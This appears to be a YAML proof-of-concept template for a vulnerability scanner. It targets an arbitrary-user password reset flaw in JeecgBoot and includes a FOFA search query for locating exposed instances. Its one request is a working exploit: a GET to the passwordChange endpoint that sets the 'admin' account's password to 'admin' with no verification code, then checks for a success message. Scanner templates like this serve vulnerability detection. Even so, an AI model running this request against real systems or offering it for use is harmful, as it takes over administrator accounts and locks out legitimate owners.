id: poc-yaml-jeecgboot-passwordchange-anyuser-password-reset
info:
  name: JeecgBoot passwordChange 任意用户密码重置漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: jeecgboot
  fofa: body="/sys/common/pdf/pdfPreviewIframe"
requests:
- method: GET
  path: /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone=
  expression: 'status_code == 200 &&

    contains(body,"\"success\":true") &&

    contains(body,"密码修改完成") &&

    contains(content_type,"application/json") &&

    !contains(body,"<")

    '
variables: {}
transport: http
